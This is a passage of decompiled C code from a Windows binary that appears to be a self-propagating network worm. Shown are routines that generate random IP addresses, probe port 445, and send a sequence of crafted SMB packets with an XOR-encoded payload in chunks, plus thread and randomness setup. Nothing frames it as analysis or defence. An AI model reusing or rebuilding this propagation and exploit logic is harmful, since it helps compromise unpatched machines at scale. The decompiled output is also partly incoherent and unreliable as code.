    memcpy((char *)&g906, (char *)&v7, 355);
    g907 = -0x18000000;
    g908 = 0x3f446e49;
    *(int16_t *)&g909 = 0;
    g910 = 18;
    g911 = 1500;
    memcpy((char *)&g912, (char *)&g56, 375);
    g913 = -0x10000000;
    g914 = 0x3f12d0ab;
    *(int16_t *)&g915 = 0;
    g916 = 18;
    g917 = v1;
    memcpy((char *)&g918, (char *)&v7, 355);
    g919 = 0x30000000;
    g920 = 0x3f2e42b6;
    *(int16_t *)&g921 = 0;
    g922 = 19;
    g923 = 1500;
    memcpy((char *)&g924, (char *)&g56, 375);
    g925 = -0xc000000;
    g926 = 0x3f3349ef;
    *(int16_t *)&g927 = 0;
    g928 = 19;
    g929 = v1;
    memcpy((char *)&g930, (char *)&v7, 355);
    g931 = -0x2c000000;
    g932 = 0x3f398127;
    *(int16_t *)&g933 = 0;
    g934 = 20;
    g935 = v3;
    memcpy((char *)&g936, (char *)&g54, 365);
    g937 = -0x58000000;
    g938 = 0x3f4fd1e8;
    *(int16_t *)&g939 = 0;
    g940 = 20;
    g941 = v3;
    memcpy((char *)&g942, (char *)&g55, 365);
    g943 = 0x50000000;
    g944 = 0x3f168835;
    *(int16_t *)&g945 = 0;
    g946 = 21;
    g947 = v3;
    memcpy((char *)&g948, (char *)&g54, 365);
    g949 = -0x4c000000;
    g950 = 0x3f3875e0;
    *(int16_t *)&g951 = 0;
    g952 = 21;
    g953 = v3;
    memcpy((char *)&g954, (char *)&g55, 365);
    v1 = 3;
    v3 = 1152;
    g955 = 0x7c000000;
    g956 = 0x3f315570;
    *(int16_t *)&g957 = 0;
    g958 = 3;
    g959 = 1152;
    memcpy((char *)&g960, (char *)&g59, 288);
    g961 = -0xe000000;
    g962 = 0x3f448355;
    *(int16_t *)&g963 = 0;
    g964 = 4;
    g965 = v3;
    memcpy((char *)&g966, (char *)&g59, 288);
    g967 = 0x70000000;
    g968 = 0x3f14b464;
    *(int16_t *)&g969 = 0;
    g970 = 5;
    g971 = v3;
    memcpy((char *)&g972, (char *)&g59, 288);
    g973 = 0x2d800000;
    g974 = 0x3f6e24d2;
    *(int16_t *)&g975 = 0;
    g976 = 6;
    g977 = v3;
    memcpy((char *)&g978, (char *)&g59, 288);
    g979 = -0x64000000;
    g980 = 0x3f3a3e9a;
    *(int16_t *)&g981 = 0;
    g982 = 7;
    g983 = v3;
    memcpy((char *)&g984, (char *)&g59, 288);
    g985 = -0x6000000;
    g986 = 0x3f446a89;
    *(int16_t *)&g987 = 0;
    g988 = 8;
    g989 = v3;
    memcpy((char *)&g990, (char *)&g59, 288);
    g991 = -0x4c000000;
    g992 = 0x3f3940ee;
    *(int16_t *)&g993 = 0;
    g994 = 9;
    g995 = v3;
    memcpy((char *)&g996, (char *)&g59, 288);
    g997 = -0x30000000;
    g998 = 0x3f16ac94;
    *(int16_t *)&g999 = 0;
    g1000 = 10;
    g1001 = v3;
    memcpy((char *)&g1002, (char *)&g59, 288);
    g1003 = -0x2c000000;
    g1004 = 0x3f393a74;
    *(int16_t *)&g1005 = 0;
    g1006 = 11;
    g1007 = v3;
    memcpy((char *)&g1008, (char *)&g59, 288);
    g1009 = -0x60000000;
    g1010 = 0x3f0c14b3;
    *(int16_t *)&g1011 = 0;
    g1012 = 12;
    g1013 = v3;
    memcpy((char *)&g1014, (char *)&g59, 288);
    g1015 = 0x10000000;
    g1016 = 0x3f202237;
    *(int16_t *)&g1017 = 0;
    g1018 = 13;
    g1019 = v3;
    memcpy((char *)&g1020, (char *)&g59, 288);
    g1021 = -0x1e800000;
    g1022 = 0x3f673c0f;
    *(int16_t *)&g1023 = 0;
    g1024 = 14;
    g1025 = v3;
    memcpy((char *)&g1026, (char *)&g59, 288);
    g1027 = 0x2e000000;
    g1028 = 0x3f40e4f9;
    *(int16_t *)&g1029 = 0;
    g1030 = 15;
    g1031 = v3;
    memcpy((char *)&g1032, (char *)&g59, 288);
    g1033 = 0;
    g1034 = 0x3f1742a3;
    *(int16_t *)&g1035 = 0;
    g1036 = 17;
    g1037 = v3;
    memcpy((char *)&g1038, (char *)&g59, 288);
    g1039 = 0;
    g1040 = 0x3f07de43;
    *(int16_t *)&g1041 = 0;
    g1042 = 18;
    g1043 = v3;
    memcpy((char *)&g1044, (char *)&g59, 288);
    g1045 = 0x28000000;
    g1046 = 0x3f2f0189;
    *(int16_t *)&g1047 = 0;
    g1048 = 19;
    g1049 = v3;
    memcpy((char *)&g1050, (char *)&g59, 288);
    g1051 = 0x70000000;
    g1052 = 0x3f34b109;
    *(int16_t *)&g1053 = 0;
    g1054 = 20;
    g1055 = v3;
    memcpy((char *)&g1056, (char *)&g59, 288);
    g1057 = 0x74000000;
    g1058 = 0x3f4ab21d;
    *(int16_t *)&g1059 = 0;
    g1060 = 21;
    g1061 = v3;
    memcpy((char *)&g1062, (char *)&g59, 288);
    g1063 = -0x5c000000;
    g1064 = 0x3f40f76d;
    int16_t v8 = v1; // 0x406aed
    *(int16_t *)&g1065 = v8;
    g1066 = v1;
    g1067 = 0xea16800;
    g1068 = 0x4023ef72;
    *(int16_t *)&g1069 = v8;
    g1070 = 4;
    g1071 = 0x8000000;
    g1072 = 0x3f20c1b3;
    *(int16_t *)&g1073 = v8;
    g1074 = 5;
    g1075 = 0x1d000000;
    g1076 = 0x3f565f79;
    *(int16_t *)&g1077 = v8;
    g1078 = 6;
    g1079 = 0;
    g1080 = 0x3f11a931;
    *(int16_t *)&g1081 = v8;
    g1082 = 7;
    g1083 = 0;
    g1084 = 0x3f1216ea;
    *(int16_t *)&g1085 = v8;
    g1086 = 8;
    g1087 = 0x4a000000;
    g1088 = 0x3f72d7f5;
    *(int16_t *)&g1089 = v8;
    g1090 = 9;
    g1091 = -0x20000000;
    g1092 = 0x3f0b5bbf;
    *(int16_t *)&g1093 = v8;
    g1094 = 10;
    g1095 = 0x20000000;
    g1096 = 0x3f0d5627;
    *(int16_t *)&g1097 = v8;
    g1098 = 11;
    g1099 = 0;
    g1100 = 0x3f0f98c4;
    *(int16_t *)&g1101 = v8;
    g1102 = 12;
    g1103 = -0x40000000;
    g1104 = 0x3f008019;
    *(int16_t *)&g1105 = v8;
    g1106 = 13;
    g1107 = -0x80000000;
    g1108 = 0x3f02cd2e;
    *(int16_t *)&g1109 = v8;
    g1110 = 14;
    g1111 = -0x80000000;
    g1112 = 0x3efe0e2a;
    *(int16_t *)&g1113 = v8;
    g1114 = 15;
    g1115 = -0x80000000;
    g1116 = 0x3eff8be1;
    *(int16_t *)&g1117 = v8;
    g1118 = 17;
    g1119 = -0x74400000;
    g1120 = 0x3f760747;
    *(int16_t *)&g1121 = 0;
    g1122 = g6;
    g1123 = 124;
    memcpy((char *)&g1124, (char *)&g60, 20);
    *(char *)&g1124 = *(char *)&g60;
    g1125 = 0x7e680000;
    g1126 = 0x3fbf1459;
    *(int16_t *)&g1127 = (int16_t)g6;
    g1128 = g6;
    g1129 = 0x65200000;
    g1130 = 0x3f88dd14;
    *(int16_t *)&g1131 = 0;
    g1132 = g6;
    g1133 = 81;
    memcpy((char *)&g1134, (char *)&g61, 20);
    *(char *)&g1134 = *(char *)&g61;
    g1135 = 0x20000000;
    g1136 = 0x3f12bc9b;
    int16_t v9 = v1; // 0x406d88
    *(int16_t *)&g1137 = v9;
    g1138 = 18;
    g1139 = -0x40000000;
    g1140 = 0x3f0c1abd;
    *(int16_t *)&g1141 = v9;
    g1142 = 19;
    g1143 = -0x40000000;
    g1144 = 0x3ef76f43;
    *(int16_t *)&g1145 = v9;
    g1146 = 20;
    g1147 = -0x80000000;
    g1148 = 0x3f045e39;
    *(int16_t *)&g1149 = v9;
    g1150 = 21;
    g1151 = 0x40000000;
    g1152 = 0x3ef6ad2f;
    *(int16_t *)&g1153 = (int16_t)g6;
    g1154 = g6;
    g1155 = 0x65200000;
    g1156 = 0x3f88dd14;
    *(int16_t *)&g1157 = 0;
    g1158 = g6;
    g1159 = 85;
    memcpy((char *)&g1160, (char *)&g62, 21);
    *(char *)&g1160 = *(char *)&g62;
    g1161 = 0xac00000;
    g1162 = 0x3f837956;
    *(int16_t *)&g1163 = (int16_t)g6;
    g1164 = g6;
    g1165 = 0x3c800000;
    g1166 = 0x3f8441dd;
    *(int16_t *)&g1167 = (int16_t)v1;
    g1168 = g6;
    g1169 = -0x58e00000;
    g1170 = 0x3f855ec8;
    int32_t v10;
    g2 = v10;
    return 0;
}

// Address range: 0x406eb0 - 0x406ecf
int32_t function_406eb0(int32_t a1) {
    // 0x406eb0
    int32_t v1;
    if (v1 == 0) {
        // 0x406eba
        g1 = 1;
        return 1;
    }
    // 0x406ec0
    g1 = 0;
    return 0;
}

// Address range: 0x406ed0 - 0x406eff
int32_t function_406ed0(int32_t a1) {
    int32_t result = llvm_bswap_i32(a1) ^ 2 * a1; // 0x406efd
    g1 = result;
    return result;
}

// Address range: 0x406f00 - 0x406f4f
int32_t function_406f00(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = g7; // 0x406f07
    int32_t v2 = 0; // eax
    if (a3 <= 0) {
        // 0x406f47
        g7 = v1;
        return 0;
    }
    int32_t v3 = g3; // 0x406f1e
    int32_t v4 = 0; // 0x406f37
    // branch -> 0x406f1f
    while (true) {
        int32_t v5 = v4 & -0x7ffffffd; // 0x406f2e
        if (v4 <= 0) {
            // 0x406f29
            v5 = (v4 + 3 | -4) + 1;
            // branch -> 0x406f2e
        }
        unsigned char v6 = *(char *)(v5 + 8 + g8); // 0x406f2e
        char * v7 = (char *)(a2 + v4); // 0x406f32_0
        int32_t v8 = (g3 & -256 | (int32_t)*v7) ^ (int32_t)v6; // 0x406f35
        g3 = v8;
        *v7 = (char)v8;
        int32_t v9 = v2 + 1; // 0x406f3a
        v2 = v9;
        if (v9 >= a3) {
            // break -> 0x406f3f
            break;
        }
        v4 = v9;
        // continue -> 0x406f1f
    }
    // 0x406f3f
    g3 = v3;
    g7 = v1;
    return 0;
}

// Address range: 0x406f50 - 0x40729f
int32_t function_406f50(int32_t a1, int32_t a2, char * a3, char * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18, int32_t a19, int32_t a20, int32_t a21, int32_t a22, int32_t a23, int32_t a24, int32_t a25, int32_t a26, int32_t a27, int32_t a28, int32_t a29) {
    g1 = 0x20e4;
    int32_t v1;
    function_409860(v1);
    int32_t v2 = g7; // 0x406f5c
    int32_t v3 = g5; // bp-16
    int16_t * buf = NULL; // bp+28
    int32_t v4;
    memset((char *)&v4, 0, 1073);
    v4 = 0;
    *(char *)((int32_t)&v4 | 2) = 0;
    int32_t buf2 = 0; // 0x4324
    int32_t v5;
    memset((char *)&v5, 0, 1023);
    v5 = 0;
    *(char *)((int32_t)&v5 | 2) = 0;
    char * v6 = NULL;
    int32_t v7;
    int32_t v8;
    int32_t v9;
    int32_t v10;
    if (v7 == 0) {
        // 0x406fd4
        v10 = g1174;
        v9 = 0x1800;
        v8 = &g633;
        // branch -> 0x406fe4
    } else {
        // 0x406fc2
        v10 = (int32_t)g1173;
        v9 = 0x1305;
        v8 = &g615;
        // branch -> 0x406fe4
    }
    // 0x406fe4
    g3 = v9;
    int32_t v11 = v8; // ebp
    char * hMem = GlobalAlloc(64, v9 + 12 + v8); // 0x406feb
    int32_t v12 = (int32_t)hMem; // 0x406feb_6
    int32_t v13 = v12; // eax
    if (hMem == NULL) {
        // 0x407292
        g7 = v2;
        return 0;
    }
    uint32_t v14 = v11; // 0x406ffd
    char * v15 = (char *)(g3 + v12);
    memcpy(v15, (char *)v10, v14 / 4);
    memcpy(v15, (char *)v10, v14 & 3);
    int32_t v16 = g3; // 0x407010
    int32_t v17 = v11; // 0x407010
    int32_t v18 = v17 + v16; // 0x407010
    int32_t v19;
    int32_t v20; // 0x407030
    int32_t v21;
    int32_t v22;
    int32_t v23;
    uint32_t v24;
    char * v25;
    char * v26;
    char * v27;
    uint32_t v28; // 0x4071c7
    uint32_t v29; // 0x407231
    int32_t sock; // 0x407166
    int32_t sock2; // 0x40725a
    int32_t v30; // 0x4071b951
    if (v18 > 0) {
        // 0x407022
        if ((v18 & -0x7ffffffd) != 0) {
            // 0x40702a
            v20 = (v18 >> 31 & 3) + v18;
            v13 = v12;
            v19 = v20 - v20 % 4 + 4;
            // branch -> 0x407044
        } else {
            v19 = v18;
        }
        // 0x407044
        v26 = (char *)v19;
        if (v7 == 0) {
            // 0x407074
            g7 = &g102;
            g103 = v17 + 3978;
            *(int32_t *)(v16 + (int32_t)&g100) = v17;
            *(int32_t *)(g3 + (int32_t)&g101) = 1;
            // branch -> 0x407097
        } else {
            // 0x40704f
            g7 = (int32_t)&g98;
            *(int32_t *)&g99 = v17 + 3440;
            *(int32_t *)(v16 + (int32_t)&g96) = v17;
            *(int32_t *)(g3 + (int32_t)&g97) = 1;
            // branch -> 0x407097
        }
        // 0x407097
        v24 = g3;
        v27 = (char *)v13;
        memcpy(v27, (char *)g7, v24 / 4);
        memcpy(v27, (char *)g7, v24 & 3);
        function_406f00(v23, v13, v19, v3);
        g3 = ((v19 >> 31 & 4095) + v19) / 0x1000;
        v11 = v19 & -0x7ffff001;
        if (v19 <= 0) {
            // 0x4070d9
            v11 = (v19 + 4095 | -0x1000) + 1;
            // branch -> 0x4070e1
        }
        // 0x4070e1
        memcpy((char *)&buf, (char *)&g91, 17);
        buf = (int16_t *)(int32_t)*(int16_t *)&g91;
        g7 = 0;
        if (g3 > 0) {
            // 0x40710b
            v30 = 0;
            // branch -> 0x40710b
            while (true) {
                // 0x40710b
                v6 = v26;
                function_406f00(v23, (int32_t)&v6, 12, v3);
                memcpy((char *)&v21, (char *)(g7 + v12), 1024);
                sock = v22;
                g7 = sock;
                if (send(sock, (char *)&buf, 0x1052, 0) != -1) {
                  lab_0x407184_2:
                    // 0x407184
                    if (recv(g7, (char *)&buf2, 0x1000, 0) != -1) {
                        // 0x40719e
                        int32_t v31;
                        if ((char)v31 == 82) {
                            int32_t v32 = v30 + 1; // 0x4071b0
                            if (v32 < g3) {
                                // 0x407107
                                g7 = *(int32_t *)((int32_t)&v3 + 36);
                                v30 = v32;
                                // branch -> 0x40710b
                                continue;
                            }
                        }
                    }
                }
            }
        }
        // 0x4071c7
        v28 = v11;
        if (v28 >= 1) {
            // 0x4071cf
            htons((int16_t)(v28 + 78));
            g3 *= 0x1000;
            v6 = v26;
            function_406f00(v23, (int32_t)&v6, 12, v3);
            v29 = v11;
            v25 = (char *)(g3 + v12);
            memcpy((char *)&v21, v25, v29 / 4);
            memcpy((char *)&v21, v25, v29 & 3);
            sock2 = v22;
            if (send(sock2, (char *)&buf, v11 + 82, 0) != -1) {
                // 0x407272
                recv(sock2, (char *)&buf2, 0x1000, 0);
                // branch -> 0x407287
            }
        }
        // 0x407287
        GlobalFree(hMem);
        // branch -> 0x407292
        // 0x407292
        g7 = v2;
        return 0;
    }
    // 0x40701d
    if ((v18 + 3 || -4) != -1) {
        // 0x40702a
        v20 = (v18 >> 31 & 3) + v18;
        v13 = v12;
        v19 = v20 - v20 % 4 + 4;
        // branch -> 0x407044
    } else {
        v19 = v18;
    }
    // 0x407044
    v26 = (char *)v19;
    if (v7 == 0) {
        // 0x407074
        g7 = &g102;
        g103 = v17 + 3978;
        *(int32_t *)(v16 + (int32_t)&g100) = v17;
        *(int32_t *)(g3 + (int32_t)&g101) = 1;
        // branch -> 0x407097
    } else {
        // 0x40704f
        g7 = (int32_t)&g98;
        *(int32_t *)&g99 = v17 + 3440;
        *(int32_t *)(v16 + (int32_t)&g96) = v17;
        *(int32_t *)(g3 + (int32_t)&g97) = 1;
        // branch -> 0x407097
    }
    // 0x407097
    v24 = g3;
    v27 = (char *)v13;
    memcpy(v27, (char *)g7, v24 / 4);
    memcpy(v27, (char *)g7, v24 & 3);
    function_406f00(v23, v13, v19, v3);
    g3 = ((v19 >> 31 & 4095) + v19) / 0x1000;
    v11 = v19 & -0x7ffff001;
    if (v19 <= 0) {
        // 0x4070d9
        v11 = (v19 + 4095 | -0x1000) + 1;
        // branch -> 0x4070e1
    }
    // 0x4070e1
    memcpy((char *)&buf, (char *)&g91, 17);
    buf = (int16_t *)(int32_t)*(int16_t *)&g91;
    g7 = 0;
    if (g3 > 0) {
        int32_t v33 = (int32_t)&v6;
        v30 = 0;
        // branch -> 0x40710b
        while (true) {
            // 0x40710b
            v6 = v26;
            function_406f00(v23, v33, 12, v3);
            memcpy((char *)&v21, (char *)(g7 + v12), 1024);
            sock = v22;
            g7 = sock;
            if (send(sock, (char *)&buf, 0x1052, 0) != -1) {
                goto lab_0x407184_2;
            }
            // 0x4071c7
            v28 = v11;
            if (v28 >= 1) {
                // 0x4071cf
                htons((int16_t)(v28 + 78));
                g3 *= 0x1000;
                v6 = v26;
                function_406f00(v23, (int32_t)&v6, 12, v3);
                v29 = v11;
                v25 = (char *)(g3 + v12);
                memcpy((char *)&v21, v25, v29 / 4);
                memcpy((char *)&v21, v25, v29 & 3);
                sock2 = v22;
                if (send(sock2, (char *)&buf, v11 + 82, 0) != -1) {
                    // 0x407272
                    recv(sock2, (char *)&buf2, 0x1000, 0);
                    // branch -> 0x407287
                    // 0x407287
                    GlobalFree(hMem);
                    // branch -> 0x407292
                    // 0x407292
                    g7 = v2;
                    return 0;
                }
            }
            // 0x407287
            GlobalFree(hMem);
            // branch -> 0x407292
            // 0x407292
            g7 = v2;
            return 0;
        }
    }
    // 0x4071c7
    v28 = v11;
    if (v28 >= 1) {
        // 0x4071cf
        htons((int16_t)(v28 + 78));
        g3 *= 0x1000;
        v6 = v26;
        function_406f00(v23, (int32_t)&v6, 12, v3);
        v29 = v11;
        v25 = (char *)(g3 + v12);
        memcpy((char *)&v21, v25, v29 / 4);
        memcpy((char *)&v21, v25, v29 & 3);
        sock2 = v22;
        if (send(sock2, (char *)&buf, v11 + 82, 0) != -1) {
            // 0x407272
            recv(sock2, (char *)&buf2, 0x1000, 0);
            // branch -> 0x407287
        }
    }
    // 0x407287
    GlobalFree(hMem);
    // branch -> 0x407292
    // 0x407292
    g7 = v2;
    return 0;
}

// Address range: 0x4072a0 - 0x40747f
int32_t function_4072a0(char * cp, int32_t a2, int32_t host_short) {
    int32_t v1 = g3; // 0x4072a6
    int32_t v2 = g7; // 0x4072a7
    int32_t v3 = g5; // bp-1064
    int32_t buf = 0; // bp-1024
    int32_t addr = 2; // bp-1048
    int32_t v4;
    memset((char *)&v4, 0, 255);
    v4 = 0;
    *(char *)((int32_t)&v4 | 2) = 0;
    int32_t v5 = inet_addr(cp); // 0x4072cd
    htons((int16_t)host_short);
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x4072ee
    g7 = sock_fd;
    if (sock_fd == -1) {
        // 0x40746c
        return 0;
    }
    // 0x4072fe
    if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1 || send(g7, (char *)&g76, 137, 0) == -1 || recv(g7, (char *)&buf, 1024, 0) == -1 || send(g7, (char *)&g77, 140, 0) == -1 || recv(g7, (char *)&buf, 1024, 0) == -1) {
        // 0x407466
        closesocket(g7);
        // branch -> 0x40746c
        // 0x40746c
        return 0;
    }
    // 0x407380
    int32_t v6;
    *(char *)&g79 = (char)v6;
    int32_t v7;
    char v8 = v7; // 0x40739c
    g80[0] = v8;
    if (send(g7, (char *)&g78, 96, 0) == -1 || recv(g7, (char *)&buf, 1024, 0) == -1) {
        // 0x407466
        closesocket(g7);
        // branch -> 0x40746c
        // 0x40746c
        return 0;
    }
    // 0x4073ca
    int32_t v9;
    char v10 = v9; // 0x4073e0
    *(char *)&g82 = v10;
    int32_t v11;
    char v12 = v11; // 0x4073e5
    *(char *)&g83 = v12;
    char v13 = g3 & -256 | v6 & 255; // 0x4073eb
    *(char *)&g84 = v13;
    g85[0] = v8;
    *(char *)&g92 = v10;
    *(char *)&g93 = v12;
    *(char *)&g94 = v13;
    g95[0] = v8;
    if (send(g7, (char *)&g81, 82, 0) == -1) {
        // 0x407466
        closesocket(g7);
        // branch -> 0x40746c
        // 0x40746c
        return 0;
    }
    // 0x407418
    if (recv(g7, (char *)&buf, 1024, 0) != -1) {
        // 0x40742f
        int32_t v14;
        if ((char)v14 == 81) {
            // 0x407436
            int32_t v15;
            g5 = v15;
            int32_t v16 = function_406eb0(v15); // 0x407446
            g3 = v16;
            int32_t v17;
            int32_t v18;
            function_406f50(g7, v16, (char *)function_406ed0(v15), (char *)a2, (int32_t)(char *)v15, (int32_t)(struct sockaddr *)v15, (int32_t)(char *)v17, v3, v2, v1, v18, addr, v5, 0, 0, 0, v17, buf, 0, 0, 0, 0, 0, 0, v9, v6, 0, 0, 0);
            // branch -> 0x407466
        }
    }
    // 0x407466
    closesocket(g7);
    // branch -> 0x40746c
    // 0x40746c
    return 0;
}

// Address range: 0x407480 - 0x40753f
int32_t function_407480(int32_t a1) {
    g4 = a1;
    int32_t v1 = g5; // bp-296
    int32_t type = 1; // edi
    int32_t v2 = 1; // bp-272
    int32_t addr = 2; // bp-288
    htons(445);
    int32_t sock_fd = socket(AF_INET, type, IPPROTO_TCP); // 0x4074ca
    if (sock_fd == -1) {
        // 0x4074d6
        g5 = v1;
        g1 = 0;
        return 0;
    }
    // 0x4074e1
    ioctlsocket(sock_fd, -0x7ffb9982, &v2);
    int32_t writefds = type;
    int32_t timeout = type;
    connect(sock_fd, (struct sockaddr *)&addr, 16);
    g4 = &timeout;
    g6 = &writefds;
    int32_t result = select(0, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout); // 0x407522
    closesocket(sock_fd);
    g1 = result;
    g5 = v1;
    return result;
}

// Address range: 0x407540 - 0x40761f
int32_t function_407540(char * a1, int32_t a2, int32_t a3) {
    struct in_addr in; // 0x407567
    int32_t v1 = g7; // bp-264
    int32_t v2 = g5; // bp-268
    int32_t v3 = &v2; // 0x407547_0
    int32_t v4;
    int32_t v5 = &v4; // 0x40754f_0
    int32_t str = 0; // bp-260
    memset((char *)&v4, 0, 64);
    v4 = 0;
    *(char *)(v5 | 2) = 0;
    g5 = v5 | 3;
    in = (struct in_addr){
        .e0 = 0
    };
    in.e0 = (int32_t)a1;
    char * str2 = inet_ntoa(in); // 0x407567
    strncpy((char *)&str, str2, 16);
    int32_t v6 = function_401980((struct sockaddr *)&str, 445); // 0x407582
    g1 = v6;
    int32_t v7 = *(int32_t *)0x40a0a4; // 0x407587
    g7 = v7;
    g1182 = v6 == 0;
    char * v8;
    if (v6 == 0) {
        // 0x407540
        v8 = (char *)&v1;
        // branch -> 0x4075d4
    } else {
        // 0x407594
        g1182 = true;
        g5 = 0;
        // branch -> 0x407596
        while (true) {
            // 0x407596
            ((int32_t (*)(int32_t))v7)(3000);
            int32_t v9 = function_401b70((char *)&v1, 1, 445); // 0x4075a9
            g1 = v9;
            g1182 = v9 == 0;
            if (v9 == 0) {
                // 0x4075b5
                ((int32_t (*)(int32_t))g7)(3000);
                g1 = function_401370(v3, 445, (int32_t)(char *)3000, (float64_t)(int64_t)3000, v2, v1, str, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0, 0, 0, 0, 0, NULL, 0, 0, 0, 0, 0, 0);
                int32_t v10 = g5; // 0x4075ce
                int32_t v11 = v10 + 1; // 0x4075ce
                g5 = v11;
                g1182 = v10 == 4;
                if (v11 < 5) {
                    // 0x4075b5
                    v7 = g7;
                    // branch -> 0x407596
                    continue;
                }
            }
            // 0x4075d4
            // branch -> 0x4075d4
        }
    }
    // 0x4075d4
    ((int32_t (*)(int32_t))v7)(3000);
    int32_t v12 = function_401b70(v8, 1, 445); // 0x4075e7
    g5 = 3000;
    g7 = v2;
    if (v12 != 0) {
        // 0x4075f5
        v2 = 445;
        function_4072a0(v8, 1, 445);
        // branch -> 0x407609
    }
    // 0x407609
    v2 = 0;
    _endthreadex(0);
    return 0;
}

// Address range: 0x407620 - 0x40765f
int32_t function_407620(void) {
    // 0x407620
    g5 = 0xa638;
    g7 = 0;
    int32_t v1 = 0xa638; // 0x407644
    int32_t v2 = 0; // 0x40762a
    // branch -> 0x40762a
    while (true) {
        int32_t result = v2 != 0 ? (int32_t)"Microsoft Base Cryptographic Provider v1.0" : 0; // 0x407637
        g1182 = v2 == 0;
        g1 = result;
        int32_t v3 = &g1176; // bp-28
        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t))v1)((int32_t)&g1176, 0, result, 1, -0x10000000);
        if (v2 != 0) {
            // 0x407650
            InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g106);
            g5 = v3;
            g7 = 0;
            return result;
        }
        int32_t v4 = g7 + 1; // 0x40764a
        g7 = v4;
        if (v4 >= 2) {
            // 0x407650
            InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g106);
            g5 = v3;
            g7 = 0;
            return result;
        }
        // 0x40764a
        v1 = g5;
        v2 = v4;
        // branch -> 0x40762a
    }
}

// Address range: 0x407660 - 0x4076af
int32_t function_407660(void) {
    if (g1176 == 0) {
        int32_t result = rand(); // 0x40766a
        g1 = result;
        return result;
    }
    // 0x407672
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g106);
    int32_t pbBuffer;
    CryptGenRandom(g1176, 4, (char *)&pbBuffer);
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g106);
    g1 = pbBuffer;
    return pbBuffer;
}

// Address range: 0x4076b0 - 0x40771f
int32_t function_4076b0(char * a1) {
    int32_t v1 = (int32_t)a1;
    g7 = v1;
    if (function_407480(v1) < 1) {
        // 0x407702
        InterlockedDecrement((int32_t *)&g1175);
        _endthreadex(0);
        return 0;
    }
    int32_t hHandle = _beginthreadex(NULL, 0, (int32_t (**)(char *))function_407540, (char *)g7, 0, NULL); // 0x4076d0
    if (hHandle == 0) {
        // 0x407702
        InterlockedDecrement((int32_t *)&g1175);
        _endthreadex(0);
        return 0;
    }
    // 0x4076df
    if (WaitForSingleObject((char *)hHandle, 0x927c0) == 258) {
        // 0x4076f2
        TerminateThread((char *)hHandle, 0);
        // branch -> 0x4076fb
    }
    // 0x4076fb
    CloseHandle((char *)hHandle);
    // branch -> 0x407702
    // 0x407702
    InterlockedDecrement((int32_t *)&g1175);
    _endthreadex(0);
    return 0;
}

// Address range: 0x407720 - 0x40783f
int32_t function_407720(int32_t a1) {
    // 0x407720
    abort();
    // UNREACHABLE
}

// Address range: 0x407840 - 0x407a1f
int32_t function_407840(char * str2, char * format, int32_t (**a3)(char *), char * a4, int32_t a5) {
    g7 = *(int32_t *)0x40a09c;
    g3 = 1;
    int32_t v1 = g5; // bp-296
    g5 = GetTickCount();
    int32_t t;
    time(&t);
    char * threadHandle = GetCurrentThread(); // 0x40786f
    int32_t v2 = t + GetCurrentThreadId() + (int32_t)threadHandle; // 0x407885
    g4 = v2;
    int32_t seed = v2 + GetTickCount(); // 0x407887
    g1 = seed;
    srand(seed);
    int32_t v3;
    g2 = v3;
    g1182 = g8 == -4;
    int32_t dwMilliseconds = (int32_t)str2;
    int32_t dwMilliseconds2 = (int32_t)format;
    int32_t v4 = 1;
    int32_t v5 = 1;
    // branch -> 0x407897
    while (true) {
        int32_t v6 = v4;
        int32_t v7 = v5;
        // branch -> 0x407897
        while (true) {
            // 0x407897
            ((int32_t (*)())g7)();
            int32_t v8 = g1 - g5; // 0x407899
            g1 = v8;
            g1182 = v8 == 0x249f00;
            int32_t v9 = v8 < 0x249f01 ? v6 : g3; // 0x4078a2
            ((int32_t (*)())g7)();
            int32_t v10 = g1 - g5 < 0x124f81 ? v7 : g3; // 0x4078b1
            int32_t v11 = 0;
            int32_t v12;
            int32_t v13; // 0x40792b28
            if (v9 != 0) {
                // 0x4078bd
                if (str2 <= (char *)31) {
                    uint64_t v14 = (int64_t)function_407660();
                    g4 = 255;
                    g1 = v14 / 255;
                    int32_t v15 = v14 % 255; // 0x4078d3
                    g6 = v15;
                    g2 = v15;
                    g1182 = v15 == 127;
                    if (v15 != 127) {
                        // break -> 0x4078dc
                        break;
                    }
                    v6 = v9;
                    v7 = v10;
                    // continue -> 0x407897
                    continue;
                } else {
                    v11 = v9;
                }
                // 0x4078e4
                v13 = v12;
                if (v10 != 0) {
                  lab_0x4078ec:
                    // 0x4078ec
                    if (str2 <= (char *)31) {
                        // 0x4078f6
                        v13 = (int64_t)function_407660() % 255;
                        // branch -> 0x407908
                    } else {
                        v13 = v12;
                    }
                }
              lab_0x407908:
                // 0x407908
                g3 = (int64_t)function_407660() % 255;
                int32_t v16 = function_407660(); // 0x407918
                int32_t str;
                sprintf((char *)&str, "%d.%d.%d.%d", g2, v13, g3, (int32_t)((int64_t)v16 % 255));
                int32_t v17 = inet_addr((char *)&str); // 0x407946
                int32_t v18 = function_407480(v17); // 0x40794c
                g1 = v18;
                g1182 = v18 == 0;
                int32_t v19 = &v1; // 0x407a04
                int32_t v20 = v10;
                if (v18 >= 1) {
                    // 0x40795c
                    g1182 = true;
                    g1 = 0;
                    ((int32_t (*)(int32_t, int32_t))g7)(0, 0);
                    g5 = 1;
                    int32_t v21 = 1; // 0x407975
                    int32_t v22 = g8; // 0x407971
                    // branch -> 0x407971
                    int32_t v23; // 0x4079fa
                    while (true) {
                        // 0x407971
                        *(int32_t *)(v22 - 4) = v21;
                        *(int32_t *)(v22 - 8) = g3;
                        *(int32_t *)(v22 - 12) = *(int32_t *)(v22 + 24);
                        *(int32_t *)(v22 - 16) = g2;
                        *(int32_t *)(v22 - 20) = (int32_t)"%d.%d.%d.%d";
                        *(int32_t *)(v22 - 24) = v22 + 36;
                        *(int32_t *)(v22 - 28) = (int32_t)&g10;
                        sprintf(str2, format);
                        int32_t v24 = g8; // 0x407989
